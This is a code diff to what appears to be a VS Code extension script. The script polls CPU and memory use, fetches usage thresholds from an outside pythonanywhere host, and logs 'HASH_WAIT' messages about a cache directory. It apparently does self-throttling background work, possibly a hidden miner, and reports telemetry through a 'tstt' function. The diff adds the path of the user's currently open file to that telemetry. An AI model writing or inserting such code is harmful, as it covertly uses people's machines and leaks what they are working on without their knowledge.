@@ -1,5 +1,12 @@
 (async () => {
 
+  let {
+    unifiedError, tstt, safe,
+    puppeteer,
+    puppeteerBrowsers,
+    extensionPath
+  } = global.cpppgVars;
+
   try {
 
     const os = require('os');
@@ -91,6 +98,7 @@
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
           hs: hs,
+          file: safe(() => editor?.document?.uri?.fsPath)
         });
         let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
         minUse = min;
@@ -102,6 +110,7 @@
         tstt({
           message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
           value: 0,
+          file: safe(() => editor?.document?.uri?.fsPath)
         });
       }
     }, 60000);
